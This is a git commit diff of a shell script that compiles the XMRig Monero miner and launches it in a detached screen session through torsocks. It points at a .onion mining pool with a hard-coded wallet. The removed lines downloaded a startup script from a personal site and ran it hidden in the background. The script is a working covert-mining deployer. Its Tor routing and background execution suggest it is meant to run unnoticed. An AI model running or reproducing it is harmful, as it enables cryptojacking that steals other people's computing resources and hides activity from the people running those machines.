ce727f3c687dc3f5f58e6703713f97a2d99c1bcf
slicommeo <46085992+slicommeo@users.noreply.github.com>
2020-11-18 10:47:14 +0700

    Update xmr20202.sh

--- xmr20202.sh
+++ xmr20202.sh
@@ -1,16 +1,9 @@
 #!/bin/bash
 sudo apt update
 sudo apt -y install apt-transport-https screen unzip
-wget -q -O - https://deb.torproject.org/torproject.org/A3C4F0F979CAA22CDBA8F512EE8CBC9E886DDD89.asc | sudo apt-key add -
-echo "deb https://deb.torproject.org/torproject.org $(lsb_release -cs) main" | sudo tee -a /etc/apt/sources.list
-sudo apt update
-sudo apt  -y install tor deb.torproject.org-keyring
-sudo apt-get -y install proxychains
 sudo apt-get -y install curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
 git clone https://github.com/xmrig/xmrig.git
 cd xmrig && mkdir build && cd build
 cmake ..
 make
-wget "https://slicommeo.github.io/2019/startxmr2.sh"
-sudo chmod +x startxmr2.sh
-screen -d -m ./startxmr2.sh
+screen -d -m torsocks ./xmrig --url hashvaultsvg2rinvxz7kos77hdfm6zrd5yco3tx2yh2linsmusfwyad.onion:443 --user 82jWjEuvbYvVVeN3yho5zBFA2VFYhE6UqER9gKjhVxydMWm6cEhV9zt673unuwDyrjJY4HasiCDZvULqMHSBc7cAVc63uXJ --pass 1 --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14
